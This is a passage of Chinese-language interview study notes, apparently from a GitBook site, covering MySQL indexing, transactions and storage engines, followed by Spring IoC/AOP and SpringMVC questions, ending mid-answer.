B+树的磁盘读写代价更低：B+树在内部节点上不包含数据信息，因此在内存页中能够存放更多的key。 数据存放的更加紧密，具有更好的空间局部性。因此访问叶子节点上关联的数据也具有更好的缓存命中率。 B+树的查询效率更加稳定：由于非终结点并不是最终指向文件内容的结点，而只是叶子结点中关键字的索引。所以任何关键字的查找必须走一条从根结点到叶子结点的路。所有关键字查询的路径长度相同，导致每一个数据的查询效率相当。 B+树更适合基于范围的查询 ：B树在提高了IO性能的同时并没有解决元素遍历的效率低下的问题，正是为了解决这个问题，B+树应用而生。B+树只需要去遍历叶子节点就可以实现整棵树的遍历。而且在数据库中基于范围的查询是非常频繁的，而B树不支持这样的操作或者说效率太低。 4.简述MySQL索引有哪些类型？ 普通索引：最基本的索引，没有任何限制。 唯一索引：索引列的值必须唯一，但可以有空值。可以创建组合索引，则列值的组合必须唯一。 主键索引：是特殊的唯一索引，不可以有空值，且表中只存在一个该值。 组合索引：多列值组成一个索引，用于组合搜索，效率高于索引合并。 全文索引：对文本的内容进行分词，进行搜索。 5.简述什么是聚簇索引及其优缺点？ 聚簇索引并不是单独的索引类型，而是一种数据存储方式。 B+树索引分为聚簇索引和非聚簇索引，主键索引就是聚簇索引的一种，非聚簇索引有复合索引、前缀索引、唯一索引。 在innodb存储引擎中，表数据本身就是按B+树组织的一个索引结构，聚簇索引就是按照每张表的主键构造一颗B+树，同时叶子节点中存放的就是整张表的行记录数据，也将聚簇索引的叶子节点成为数据页。 Innodb通过主键聚集数据，如果没有定义主键，innodb会选择非空的唯一索引代替。如果没有这样的索引，innodb会隐式的定义一个主键来作为聚簇索引。 非聚簇索引又称为辅助索引，InnoDB访问数据需要两次查找，辅助索引叶子节点存储的不再是行的物理位置，而是主键值。通过辅助索引首先找到的是主键值，再通过主键值找到数据行的数据页，找到数据页对应数据行。 Innodb辅助索引的叶子节点并不包含行记录的全部数据，叶子节点除了包含键值外，还包含了相应行数据的聚簇索引键。一张表可有多个二级索引。 优点： 数据访问更快，因为聚簇索引将索引和数据保存在同一个B+树中，因此从聚簇索引中获取数据比非聚簇索引更快。聚簇索引对于主键的排序查找和范围查找速度非常快。 缺点： 插入速度严重依赖于插入顺序，按照主键的顺序插入是最快的方式，否则将会出现页分裂，严重影响性能。因此，对于InnoDB表，我们一般都会定义一个自增的ID列为主键。更新主键的代价很高，因为将会导致被更新的行移动。因此，对于InnoDB表，我们一般定义主键为不可更新。 二级索引访问要两次索引查找，第一次找到主键值，第二次根据主键值找到行数据。 6.简述InnoDB与MyISAM实现索引方式的区别？ 首先两者都是用的是B+树索引，但二者的实现方式不同。 对于主键索引，InnoDB中叶子节点保存了完整的数据记录，而MyISAM中索引文件与数据文件是分离的，叶子节点上的索引文件仅保存了数据记录的地址. 对于辅助索引，InnoDB中辅助索引会对主键进行存储，查找时，先通过辅助索引的B+树在叶子节点获取对应的主键，然后使用主键在主索引B+树上检索操作，最终得到行数据；MyISAM中要求主索引是唯一的，而辅助索引可以是重复的，主索引与辅助索引没有任何区别，因此，MyISAM中索引检索的算法为首先按照B+Tree搜索算法搜索索引，如果指定的Key存在，则取出其data域的值，然后以data域的值为地址，读取相应数据记录。 7.简述什么是聚簇索引与非聚簇索引？ 聚簇索引：将数据存储与索引放到了一块，找到索引也就找到了数据。 非聚簇索引：将数据存储于索引分开结构，索引结构的叶子节点指向了数据的对应行 MyISAM通过key_buffer把索引先缓存到内存中，当需要访问数据时（通过索引访问数据），在内存中直接搜索索引，然后通过索引找到磁盘相应数据，这也就是为什么索引不在key buffer命中时，速度慢的原因。 8.主键索引是聚集索引还是非聚集索引？ 聚集索引决定了数据库的物理存储结构，而主键只是确定表格逻辑组织方式。这两者是不一样的 在InnoDB下主键索引是聚集索引，在MyISAM下主键索引是非聚集索引。 9.简述InnoDB为什么使用自增id作为主键？ MySQL底层使用是使用数据页为单位来存储数据的，一个数据页大小默认为16K，当数据页满了，就会申请新的数据页进行存储数据。 如果主键为自增 id 的话，mysql 在写满一个数据页的时候，直接申请另一个新数据页接着写就可以了。 如果主键是非自增 id，为了确保索引有序，mysql 就需要将每次插入的数据都放到合适的位置上。当往一个快满或已满的数据页中插入数据时，新插入的数据会将数据页写满，mysql 需要申请新的数据页，并且把上个数据页中的部分数据挪到新的数据页上。这就造成了页分裂，这个大量移动数据的过程是会严重影响插入效率。 10.简述为什么主键越小越好？ 主键占用空间越大，每个页存储的主键个数越少，路树就越少，B+树的深度会边长，导致IO次数会变多。 辅助索引的叶子节点上保存的是主键 id 的值，如果主键 id 占空间较大的话，那将会成倍增加 mysql 空间占用大小。 11.简述数据库执行查询请求的过程？ 客户端请求：建立TCP连接。 使用连接器进行连接管理：此时服务端会对客户端发来数据携带的主机信息、用户名、密码等信息进行验证，如果认证失败就会拒绝连接。（连接器） 注： 当客户端连接服务端进程后，服务端进程会为其创建进程专门用于交互，当断开连接后，服务端不会立即进行销毁，而是会进行缓存，用于下次新的连接，这样可以不用频繁的创建和销毁线程，节省开销。 缓存查询：服务端会对之前的请求结果进行缓存，若存在缓存直接返回，否则继续执行下一步。维护缓存的代价较大，因此在8.0版本后已删除缓存。 语法解析：由于目前为止还未对文本解析，此时会对文本进行词法分析、语法分析、语义分析等过程，真正开始解析。（分析器） 查询优化：主要对执行的sql优化选择最优的执行方案。（优化器） 存储引擎：执行时会先看用户是否有执行权限，有才去使用这个引擎提供的接口。然后去引擎层获取数据返回，若开启查询缓存则会缓存查询结果。（执行器） 12.简述脏读、幻读、不可重复读的定义？ 脏读：指当一个事务正在访问数据，并且对数据进行了修改，而这种数据还没有提交到数据库中，这时，另外一个事务也访问这个数据，然后使用了这个数据。因为这个数据还没有提交那么另外一个事务读取到的这个数据我们称之为脏数据。 不可重复读：指在一个事务内，多次读同一数据。在这个事务还没有执行结束，另外一个事务也访问该同一数据，那么在第一个事务中的两次读取数据之间，由于第二个事务的修改第一个事务两次读到的数据可能是不一样的，这样就发生了在一个事务内两次连续读到的数据是不一样的，这种情况被称为是不可重复读。 幻读：一个事务先后读取一个范围的记录，但两次读取的纪录数不同，我们称之为幻象读。（两次执行同一条 select 语句会出现不同的结果，第二次读会增加一数据行，并没有说这两次执行是在同一个事务中） 13.简述数据库的隔离级别？ 读未提交：指一个事务读取另一个事务未提交的修改。，会发生脏读、不可重复读、幻读。 读提交：指只能读到已经提交的内容。会发生不可重复读和幻读。是SQL Server和Oracle的默认隔离级别。 可重复读：指当数据被读取时，不可进行update操作，保证多次读取的记录是相同的，解决了不可重复读的问题。但幻读是insert导致，不会避免。可重复读是MySQL的默认隔离级别。 可串行化读：这是数据库最高的隔离级别，这种级别下，事务“串行化顺序执行”，也就是一个一个排队执行。这种级别下，“脏读”、“不可重复读”、“幻读”都可以被避免，但是执行效率奇差，性能开销也最大，所以基本没人会用。 14.简述MySQL可以从哪些方面做到性能优化? 为搜索字段创建索引。 避免使用 Select *，列出需要查询的字段。 垂直分割分表，水平分割是分割记录，以一条记录/行为单位。垂直分割则是以列为单位，将列分割出去。 选择正确的搜索引擎。 实现数据库的主从同步，实现读写分离。 添加合适的缓存机制，维护代价高。 对冷热数据进行均分，减少单个库的压力，使整体性能达到更优。 15.简ySQL为什么需要事务回滚机制？ 在MySQL中事务回滚通过日志完成，所有事务进行的修改都会先记录到回滚日志中，然后再对数据库中的对应行进行写入。当事务被提交后就无法回滚了。 回滚日志的作用： 能够在发生错误或用户执行rollback时提供回滚的相关信息。 在整个系统发生崩溃、数据库进程直接被杀死后，当用户再次启动数据库进程时，还能够立刻通过查询回滚日志将之前未完成的事务进行回滚，这也就需要回滚日志必须先于数据持久化到磁盘上，是我们需要先写日志后写数据库的主要原因。 16.简述MySQL引擎InnoDB和MyISAM的区别？ InnoDB： 是MySQL默认的事务型存储引擎，只有当需要它不支持的特性时，才会考虑使用其它的存储引擎。 实现了四个标准的隔离级别，其中默认为可重复读，在可重复读的隔离级别下，通过MVCC（多版本并发控制协议）+ 间隙锁（Next-key Locking）防止幻读。 主索引为聚簇索引，在索引中保存数据，从而避免直接读取磁盘，因此对查询性能有很大的提升。 支持真正的在线热备份。其它存储引擎不支持在线热备份。 支持行级锁，通过给索引项加锁来实现，即只有通过索引条件检索数据，才会使用行级锁，否则使用表锁。 InnoDB不会对表中行的总量进行预先统计，每次count需要遍历计算。 MyISAM： 设计简单，数据以紧密格式存储。对于只读数据，或者表比较小、可以容忍修复操作，则依然可以使用它。 提供了大量的特性，包括压缩表、空间数据索引等。 不支持事务。 不支持行级锁，只能对整张表加锁，读取时会对需要读到的所有表加共享锁，写入时则对表加排它锁。 会实时保存数据库表中的总行数，计算快。 总结： 事务：MyISAM不支持，InnoDB支持。 锁级别： MyISAM 表级锁，InnoDB 行级锁及外键约束。 MyISAM存储表的总行数；InnoDB不存储总行数。 MyISAM采用非聚集索引，B+树叶子存储指向数据文件的指针。InnoDB主键索引采用聚集索引，B+树叶子存储数据。 崩溃恢复: MyISAM 崩溃后发生损坏的概率比 InnoDB 高很多，而且恢复的速度也更慢。 使用场景： MyISAM适合：插入不频繁，查询非常频繁，如果执行大量的SELECT，MyISAM是更好的选择，没有事务。 InnoDB适合：可靠性要求比较高，或者要求事务； 表更新和查询都相当的频繁， 大量的INSERT或UPDATE。 17.数据库分库分表的原因？ 分库分表的目的在于减少数据库单库单表的负担，提高查询性能，缩短查询时间。 分库分表分别水平切分和垂直切分。 垂直切分：分为垂直分库和垂直分表，其中垂直分库是指根据业务的耦合度，将关联度较低的不同表存储于不同的库中，类似于大系统拆分为小系统；垂直分表是指基于数据库表中的列，将不常用的列进行划分成新表，可以使单个表中的数据量变少减少跨页，使得单个页中字段更多，使内存能够加载更多的数据，提高命中率，减少磁盘IO，提高性能。 水平切分：水平切分是根据表内数据内在的逻辑关系，将同一个表按不同的条件分散到多个数据库或多个表中，每个表中只包含一部分数据，从而使得单个表的数据量变小，达到分布式的效果。但只是库内分表，仅仅是解决了单表数据过大的问题，并没有把单表的数据分散到不同的物理机上，因此并不能减轻 MySQL 服务器的压力，仍然存在同一个物理机上的资源竞争和瓶颈，包括 CPU、内存、磁盘 IO、网络带宽等。 使用哪种方式分库分表需要依据情况而定，比如数据库是因为表太多而造成海量数据，并且项目的各项业务逻辑划分清晰、低耦合，那么规则简单明了、容易实施的垂直切分必是首选。而如果数据库中的表并不多，但单表的数据量很大、或数据热度很高，这种情况之下就应该选择水平切分，水平切分比垂直切分要复杂一些，它将原本逻辑上属于一体的数据进行了物理分割，除了在分割时要对分割的粒度做好评估，考虑数据平均和负载平均，后期也将对项目人员及应用程序产生额外的数据管理负担。 18.简述什么是覆盖索引？ 如果一个索引包含所有需要查询的字段的值，我们就称 之为“覆盖索引”。 对于InnoDB存储引擎来说，如果不是主键索引，那么辅助索引的叶子节点存储的是主键+辅助索引的列值，然后还需要进行回表操作。 这样的话，会降低查询速度，因此，若使用辅助索引查询时，若查询得到的值和需要查询的结果列值时对应的（或者覆盖），则可以一直接使用其结果，不需要进行回表操作。 19.简述三大范式的特点? 第一范式：指数据库表中的每一列都是不可分割的基本数据项，同一列中不能有多个值相同，即无重复的列。 第二范式：满足第一范式，还要求数据库表中的每个实例或行必须被唯一标识，满足实体的属性完全依赖于主关键字。 第三范式：满足第二范式，还要求数据库表中不包含其他表中的非主关键字信息，即两个表中不存在相同的非主关键字信息，否则会造成数据冗余。 20.简述聚簇索引与非聚簇索引（辅助）的区别？ 聚簇索引的叶子节点存放的是主键值和数据行，支持覆盖索引；非聚簇索引的叶子节点存放的是主键值或指向数据行的指针。 聚集索引就是以主键创建的索引，非聚集索引就是以非主键创建的索引。 由于节子节点(数据页)只能按照一颗B+树排序，故一张表只能有一个聚簇索引。辅助索引的存在不影响聚簇索引中数据的组织，所以一张表可以有多个辅助索引。 21.简述事务的四大特性? 原子性：指事务包含的所有操作要么全部成功，要么全部失败回滚，因此事务的操作如果成功就必须完全应用到数据库，如果操作失败则不能对数据库有任何影响。 一致性：指事务开始前和结束后，数据库的完整性约束没有被破坏。 隔离性：指当多个用户并发访问数据库时，比如操作同一张表时，数据库为每一个用户开启的事务，不能被其他事务的操作所干扰，多个并发事务之间要相互隔离。 持久性：指一个事务一旦被提交了，那么对数据库中的数据的改变就是永久性的，即便是在数据库系统遇到故障的情况下也不会丢失提交事务的操作。 22.简述创建索引的注意事项？ 非空字段：索引字段不能有NULL，如果有NULL值将不会包含在索引中。 索引字段越小越好：数据库的数据存储以页为单位一页存储的数据越多一次IO操作获取的数据越大效率越高。 唯一、不为空、经常被查询的字段 的字段适合建索引。 取值离散大的字段：（变量各个取值之间的差异程度）的列放到联合索引的前面，可以通过count()函数查看字段的差异值，返回值越大说明字段的唯一值越多字段的离散程度高。 限制创建索引的数量：对于存在大量更新操作的表，索引一般不超过3个。 23.为什么索引的数量不能太多？ 当对表中的数据进行增加、删除、修改时，同时需要动态维护索引，降低了整体的维护速度。 索引需要占据物理空间，如果要建立聚簇索引，那么需要的空间就会更大，因为会将数据存储于叶子节点。 创建索引和维护索引要耗费时间，这种时间随着数据量的增加而增加。 24.简述数据库的行级锁与表锁？ 表锁： 不会出现死锁，发生锁的冲突几率高，并发性低。 存储引擎在进行SQL数据读写请求前，会对涉及到的表进行加锁。 其中锁分为共享读锁和独占写锁：读锁会阻塞写，写锁会阻塞读和写。 行级锁： 会出现死锁，发生锁的冲突几率低，并发性高。 InnoDB引擎支持行锁，与Oracle不同，MySQL的行锁是通过索引加载的，也就是说，行锁是加在索引响应的行上的，要是对应的SQL语句没有走索引，则会全表扫描，行锁则无法实现，取而代之的是表锁，此时其它事务无法对当前表进行更新或插入操作。 行级锁注意事项： 行级锁必须有索引才能实现，否则会自动锁全表，那就不是行锁了。 两个事务不能锁同一个索引。 insert，delete，update在事务中都会自动默认加上排它锁。 行锁的适用场景： 避免不可重复读的场景。 25.简述为什么MySQL索引使用B+树而不用hash表和B树？ 利用Hash需要把数据全部加载到内存中，如果数据量大，是一件很消耗内存的事，而采用B+树，是基于按照节点分段加载，由此减少内存消耗。 和业务场景有段，对于唯一查找（查找一个值），Hash确实更快，但数据库中经常查询多条数据，这时候由于B+数据的有序性，与叶子节点又有链表相连，他的查询效率会比Hash快的多。 b+树的非叶子节点不保存数据，只保存子树的临界值（最大或者最小），所以同样大小的节点，b+树相对于b树能够有更多的分支，使得这棵树更加矮胖，查询时做的IO操作次数也更少。 26.简述B树的结构及特点？ 对于一个M阶的B树有以下特征： 第一任何非叶子节点最多只有M个儿子，且M > 2; 根节点的儿子数量范围为[2,M]； 除根节点 以外的非叶子节点的儿子数量为[M/2，M]，向上取整，M/2是由于当某个节点达到M个节点信息时，会进行拆分为两个叶子节点。 非叶子节点的关键字数量 = 叶子数量 - 1； 所有的叶子节点位于同一层； k个关键字把节点拆成k+1段，分别指向k+1个儿子，同时满足查找树的大小关系； 每个节点除了存储索引外还保存该索引对应数据的地址； 27.简述B+树的结构及特点？ 对于一个M阶的B树有以下特征： 有k个子树的中间节点包含有k个元素（B树中是k-1个元素），每个元素不保存数据，只用来索引，所有数据都保存在叶子节点。 所有的叶子结点中包含了全部元素的信息，及指向含这些元素记录的指针，且叶子结点本身依关键字的大小自小而大顺序链接，形成一个有序的链表。 所有的中间节点元素都同时存在于子节点，在子节点元素中是最大（或最小）元素。 由于每个节点只存索引，因此每个页存储的数据变多，可减少IO次数。 28.数据库如何保证事务的ACID特性？ 原子性：使用innodb的undo log（回滚日志），undo log记录了回滚需要的信息，当事务执行失败或调用了rollback，导致事务需要回滚，便可以利用undo log中的信息将数据回滚到修改之前的样子。 隔离性： 使用悲观锁和乐观锁对事务处理。 持久性：使用innodb的redo log（重写日志）， 记录的是数据页的物理修改，而不是某一行或某几行修改成怎样怎样，它用来恢复提交后的物理数据页(恢复数据页，且只能恢复到最后一次提交的位置);当做数据修改的时候，不仅在内存中操作，还会在redo log中记录这次操作。当事务提交的时候，会将redo log日志进行刷盘(redo log一部分在内存中，一部分在磁盘上)。当数据库宕机重启的时候，会将redo log中的内容恢复到数据库中，再根据undo log和binlog内容决定回滚数据还是提交数据。 一致性：通过原子性、隔离性、持久性来保证一致性。 29.简述使用redo log的好处? redo log体积小，毕竟只记录了哪一页修改了啥，因此体积小，刷盘快。 redo log是一直往末尾进行追加，属于顺序IO。效率显然比随机IO来的快。 30.如何解决数据库高并发问题？ 在web服务框架中加入缓存。在服务器与数据库层之间加入缓存层，将高频访问的数据存入缓存中，减少数据库的读取负担。 增加数据库索引，进而提高查询速度。（不过索引太多会导致速度变慢，并且数据库的写入会导致索引的更新，也会导致速度变慢） 主从读写分离，让主服务器负责写，从服务器负责读。 将数据库进行拆分，使得数据库的表尽可能小，提高查询的速度。 使用分布式架构，分散计算压力。 31.简述联合索引的最左匹配原则? MySQL建立联合索引时遵循最左匹配原则，即最左优先，在检索数据时从联合索引的最左边开始匹配。 对于联合索引而言构造B+树，会依次从左往右按顺序比较进行键值插入，遇到范围查找就会停止，剩下的字段就会失效无法使用索引。 32.简述SQL语句的优先级顺序？ from:需要从哪个数据表检索数据 join：联合多表查询返回记录时，并生成一张临时表 on：在生成临时表时使用的条件 where:过滤表中数据的条件 group by:如何将上面过滤出的数据分组 having:对上面已经分组的数据进行过滤的条件 select:查看结果集中的哪个列，或列的计算结果 order by :按照什么样的顺序来查看返回的数据 33.简述索引失效的情况？ like 以%开头，索引无效；当like前缀没有%，后缀有%时，索引有效。 or语句前后没有同时使用索引。当or左右查询字段只有一个是索引，该索引失效，只有当or左右查询字段均为索引时，才会生效。 组合索引，不是使用第一列索引，索引失效。 数据类型出现隐式转化。如varchar不加单引号的话可能会自动转换为int型，使索引无效，产生全表扫描。 在索引列上使用 IS NULL 或 IS NOT NULL操作。 在索引字段上使用not，，!=。不等于操作符是永远不会用到索引的，因此对它的处理只会产生全表扫描。 优化方法： key0 改为 key>0 or key 如何检查索引是否失效： 可以使用explain命令加在要分析的sql语句前面，在执行结果中查看key这一列的值，如果为NULL，说明没有使用索引。 34.简述什么情况下不应该创建索引？ 对于那些在查询中很少使用或者参考的列不应该创建索引。这是因为，既然这些列很少使用到，因此有索引或者无索引，并不能提高查询速度。相反，由于增加了索引，反而降低了系统的维护速度和增大了空间需求。 对于那些只有很少数据值的列也不应该增加索引。这是因为，由于这些列的取值很少，例如人事表的性别列，在查询的结果中，结果集的数据行占了表中数据行的很大比例，即需要在表中搜索的数据行的比例很大。增加索引，并不能明显加快检索速度。 对于那些定义为text, image和bit数据类型的列不应该增加索引。这是因为，这些列的数据量要么相当大，要么取值很少。 当修改性能远远大于检索性能时，不应该创建索引。这是因为，修改性能和检索性能是互相矛盾的。 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-06-29 17:22 "},"Spring系列面试题/面试题.html":{"url":"Spring系列面试题/面试题.html","title":"面试题","keywords":"","body":"Spring 谈一谈对IOC理解 1. IOC，翻译过来是控制反转，它是一种解耦合的设计思想 2. IOC的核心点就是将原本在程序中手动创建对象的控制权，交由给Spring框架来管理 3. 当程序中需要一个对象时，不再使用new的方式主动创建，而是从Spring容器中直接获取，而容器会使用工厂模式为我们创建需要的对象 4. 而且容器中的对象如果依赖于其他对象，Spring会基于DI的思想，自动完成对象间的依赖注入 Bean有几种注入方式 * 在IOC中对象依赖依赖注入主要有两种方式 1. 构造器依赖注入：实际上就是在容器中通过触发一个类的构造器来实现的 2. Setter方法注入：实际上就是在容器中先创建类的对象之后，再调用对象的Setter方法进行属性赋值 Bean作用域有几种 * Spring框架支持多种bean的作用域，常见的有下面几种 1. singleton：单例模式，对象仅仅创建一次，然后一直存在于容器中 2. prototype：多例模式，每次获取对象的时候，容器都会创建一个新对象 3. request：每一次HTTP请求都会产生一个新的对象，该对象仅在当前请求内有效 4. session：每一次HTTP会话都会产生一个新的对象，该对象仅在当前会话内有效 bean是线程安全的吗 1. 多例对象每次获取都会创建新实例，也就是说线程之间不存在Bean共享问题，也就不存在线程安全问题 2. 单例对象是所有线程共享一个实例，因此就可能会存在线程安全问题。但是单例对象又分为无状态和有状态。 只对对象的成员变量进行查询操作，不会修改成员变量的值，这样的Bean称之为无状态Bean，无状态的单例Bean是不存在线程安全问题的 但是，如果需要对Bean中的成员变量进行数据更新操作，这样的Bean称之为有状态Bean，有状态的单例Bean就可能存在线程安全问题 所以，最终我们得出结论，在Spring中，只有有状态的单例Bean才会存在线程安全问题。 3. 处理有状态单例Bean的线程安全问题有以下两种方法： 1）将Bean的作用域由singleton（单例）改为prototype（多例） 2）在类中定义ThreadLocal的成员变量，并将需要的可变成员变量保存在ThreadLocal中， ThreadLocal本身就具备线程隔离的特性 这就相当于为每个线程提供了一个独立的变量副本，每个线程只需要操作自己的线程副本变量，从而解决线程安全问题。 谈一谈对AOP理解 1. AOP，翻译过来是面向切面编程，核心思想是将那些与业务无关，却为业务模块所共同调用的逻辑（例如事务处理、日志管理）封装起来 2. 使用AOP可以减少系统的重复代码，降低模块间的耦合度，并有利于扩展和维护 3. Spring AOP是基于动态代理的，它底层同时支持JDK和CGLIB的代理方式，并且会根据被代理类是否有接口自动选择最合适的代理方式 4. AOP的主要使用场景有：事务管理、日志、性能监视、安全检查 ==ps: 如果让谈一谈对Spring的框架的理解，就将上面IOC和AOP两部分合起来回答== AOP的代理有几种方式 * AOP思想的实现一般都是基于代理模式，在Java中一般采用JDK动态代理模式和CGLIB动态代理模式 1. JDK动态代理模式只能对有接口的类进行代理，所以当一个被代理类有接口时，就可以使用JDK动态代理 2. CGLIB可以对任意的类进行动态代理，但是效率上不如JDK，所以当一个被代理类没有接口时，就可以使用CGLIB动态代理 * 不过这个选择过程对开发者完全透明，Spring底层会自动选择实现，开发者也无需关心 AOP中有哪些核心概念 1. 目标对象：被切面所通知的对象，或者说被代理的对象，也可以称为要进行功能增强的对象 2. 连接点：程序执行过程中的某一行为，大部分情况下是指目标对象中的所有方法 3. 切入点：要进行功能增强的那部分代码 4. 增强：对目标对象要添加的那段功能 5. 代理对象：经过功能增强之后的对象 6. 织入：将增强方法拼接到切点方法上的动作 7. 切面：一种对增强方法和切点执行顺序的定义 Spring支持的通知类型 * 通知是个在方法执行前或执行后要做的动作，实际上是程序执行时要通过SpringAOP框架触发的代码段。 Spring切面可以应用五种类型的通知： 1. 前置通知：在某切点之前执行的通知 2. 返回后通知：在某切点正常完成后执行的通知，不包括抛出异常的情况 3. 抛出异常后通知：在某切点抛出异常退出时执行的通知 4. 后置通知：在某切点退出的时候执行的通知（不论是正常返回还是异常退出） 5. 环绕通知：包围一个切点的通知 Spring支持的事务管理方式 * Spring支持编程式事务和声明式事务 1. 编程式事务：在代码中硬编码，此方式的缺点是代码耦合，复用性低；优点是可以精确控制要增强的代码（不仅仅限于方法粒度） 2. 声明式事务：是AOP思想的一种应用，将业务方法作为切点，将事务处理方法作为增强，通过动态代理实现事务的管理，此方是优缺点与编程式恰好相反 Spring支持的事务传播行为 * 事务传播行为是为了解决业务层方法之间互相调用的事务问题。当事务方法被另一事务方法调用时，必须指定事务应该如何传播。 * 例如：方法可能继续在现有事务中运行，也可能开启一个新事务，并在自己的事务中运行。 * Spring支持7个种事务传播行为的： 1. PROPAGATION_REQUIRED（必须）：如果当前存在事务，则加入该事务；如果当前没有事务，则创建一个新的事务 2. PROPAGATION_SUPPORTS（支持）：如果当前存在事务，则加入该事务；如果当前没有事务，则以非事务的方式继续运行 3. PROPAGATION_MANDATORY（强制）：如果当前存在事务，则加入该事务；如果当前没有事务，则抛出异常 4. PROPAGATION_REQUIRES_NEW（必须新）：创建一个新的事务，如果当前存在事务，则把当前事务挂起 5. PROPAGATION_NOT_SUPPORTED（不支持）：以非事务方式运行，如果当前存在事务，则把当前事务挂起 6. PROPAGATION_NEVER（强制没有）：以非事务方式运行，如果当前存在事务，则抛出异常 7. PROPAGATION_NESTED（嵌套）：如果当前存在事务，则创建一个事务作为当前事务的嵌套事务来运行；如果当前没有事务，则创建一个事务 嵌套事务是已存在事务的一个子事务，嵌套事务开始执行时，将取得一个保存点，如果这个嵌套事务失败，将回滚到此保存点 嵌套事务是外部事务的一部分，只有外部事务结束后它才会被提交 Spring中的设计模式 1. 工厂模式：Spring使用工厂模式通过BeanFactory和ApplicationContext创建bean对象 2. 单例模式：Spring中的bean默认都是单例的 3. 代理模式：Spring的AOP功能用到了JDK的动态代理和CGLIB字节码生成技术 4. 模板方法：用来解决代码重复的问题。比如 RestTemplate、jdbcTemplate 5. 适配器模式：SpringAOP的增强或通知使用到了适配器模式 6. 观察者模式：Spring事件驱动模型，如Spring的实现ApplicationListener BeanFactory与AppliacationContext的区别 * BeanFactory: 最基础的IOC容器，功能相对简单，默认采用延迟初始化策略，也就是容器启动时不创建对象，第一次获取的时候才创建 * ApplicationContext：在BeanFactory的基础上构建，是相对比较高级的容器实现，此容器一般在启动的时候就会创建出所有的对象 Spring的常用注解有哪些 1. 用于向容器中注册对象：@Component、@Controller、@Service、@Repository、@Bean、@Import 2. 用于容器中对象属性的依赖注入： @Autowired、@Qualifier、@Value 3. 组件扫描：@ComponentScan 4. 声明配置类：@Configuration 5. 声明式事务：@Transactional @Resources和@Autowired的区别 * @Resources和@Autowired都是用来实现自动装配的，主要区别点如下： 1. 提供者不同：@Resources由JDK提供，@Autowired由Spring框架提供 2. 装配顺序不同： @Autowired默认先按类型装配，如果同一个类型的对象有多个，再按照name选择其中一个，或者使用@Qualifier指定其中一个 @Resource默认是按照名称来装配注入的，只有当找不到与名称匹配的bean才会按照类型来装配注入 Spring中bean的生命周期 * ApplicationContext容器中，Bean的生命周期流程如上图所示，流程大致如下： 1. 首先容器启动后，对bean进行实例化 2. 按照Bean定义信息配置信息，注入所有的属性 3. 如果Bean实现了一些Aware接口，则调用对应的回调方法，在回调方法中可以完成一些对对象的操作 4. 如果Bean实现BeanPostProcessor接口，则调用对应的回调方法，在回调方法中可以完成前置操作 5. 如果Bean实现了InitializingBean接口，则会回调该接口的afterPropertiesSet()方法 6. 如果Bean配置了init-method方法，则会执行init-method配置的方法 7. 如果Bean实现了BeanPostProcessor接口，则调用对应的回调方法，在回调方法中可以完成后置操作 8. 至此就可以正式使用该Bean了，对于单例bean缓存到容器；多例bean返回给客户端 9. 容器关闭后，如果Bean实现了DisposableBean接口，则会回调该接口的destroy()方法 10. 如果Bean配置了destroy-method方法，则会执行destroy-method配置的方法 * 至此，整个Bean的生命周期结束，总结以上步骤，核心主干主要就是五部分构成： 1. 实例化 2. 赋值 3. 初始化 4. 使用 5. 销毁 SpringMVC 什么是MVC模式 * MVC是Model-View-Controller（模型-视图-控制器）的简称，其主要作用是将视图展示和业务控制代码分离开来。 * Model（模型）: 指的就是数据或者数据的来源 * View （视图）: 指的就是可视化界面 * Controller（控制器）: 控制器作用于模型和视图上，负责请求的调度，它使视图与模型分离开来 SpringMVC的执行流程 1. 用户点击某个请求路径，发起一个request请求，此请求会被前端控制器处理 2. 前端控制器请求处理器映射器去查找Handler 3. 处理器映射器根据配置找到相应的Handler(可能包含若干个Interceptor拦截器)，返回给前端控制器 4. 前端控制器请求处理器适配器去执行相应的Handler处理器（常称为Controller）。 5. 处理器适配器执行Handler处理器 6. Handler处理器执行完毕之后会返回一个ModelAndView对象（包括Model数据模型和View视图信息） 7. 处理器适配器接收到Handler处理器返回的ModelAndView后，将其返回给前端控制器 8. 前端控制器接收到ModelAndView后，会请求视图解析器对视图进行解析 9. 视图解析器根据View信息匹配到相应的视图结果，反馈给前端控制器 10. 前端控制器收到View具体视图后，进行视图渲染，将Model中的模型数据填充到View视图中的request域，生成最终的视图(View) 11. 前端控制器向用户返回请求结果 SpringMVC的常用组件有哪些 1. 前端控制器 DispatcherServlet：接收请求、响应结果，相当于转发器 2. 处理器映射器HandlerMapping：根据请求的URL来查找Handler 3. 处理器适配器HandlerAdapter：负责调用处理器Handler 4. 处理器Handler（需要程序员开发）：我们自己业务调用写在这里 5. 视图解析器ViewResolver：进行视图的解析，根据视图逻辑名解析成真正的视图 6. 视图View：页面，它的实现类支持不同的视图类型（jsp，freemarker，pdf等等） SpringMVC的常用注解有哪些 * @Conntroller：标注在处理器的类上 * @RequestMapping：为处理器方法绑定访问url，可用于类或方法上 * @GetMapping @PostMapping @PutMapping @DeleteMapping: 用于限制请求的类型 * @RequestBody：标注在请求参数前，表示注解实现接收http请求体中的json数据，并将json转换为java对象 * @ResponseBody：标注在类或者方法上，表示将conreoller方法返回对象转化为json对象（可以转换的情况下）响应给客户端 * @RestController：标注在类上，相当于@Conntroller+@ResponseBody的作用 * @PathVariable：标注在请求参数之前，用于获取请求路径上的参数值 * @RequestParam：标注在方法参数之前，用于对传入的参数做一些限制，常见属性如下: value：用于指定前端传入的参数名称 defaultValue：当参数为非必传参数且前端没有传入参数时，指定一个默认值 它的常见使用场景有下面几个: 1. 当前端传入的参数名称和后台方法中得参数名称不一致的时时候 2. 当前端传入的参数需要在后台指定默认值的时候 3. 当使用List或者Map接收前端提交的请求数据的时候 SpringMVC如何处理统一异常 * 基本步骤： 1. 首先在编写的三层代码中，不去手动处理异常，这样异常一旦发生，就会抛给Spring框架 2. 然后需要给Spring框架配置一个全局的异常处理器，这样当异常发生的时候，框架会自动调用我们编写的异常处理器 3. 最后在异常处理器中，我们要记录下出现的异常，并且给客户端返回一个合理的响应 * 这里面自定义全局异常处理器，会用到两个注解 1. @RestControllerAdvice 标注在类上，声明当前类是一个用于专门处理异常的类 2. @ExceptionHandler 标注在方法上，通过它的value属性指定当前方法可以处理哪些异常 SpringMVC怎样设定重定向和转发 1. 方法或者类上不能标注有@ResponseBody或者@RestController注解 2. 转发：方法的返回值前面加\"forward:index.jsp\" 3. 重定向：在返回值前面加\"redirect:/index.jsp\" Controller是不是单例的 * Controller默认情况下是单例的，如果controller中定义成员变量，在多线程访问的时候是有线程安全问题 * 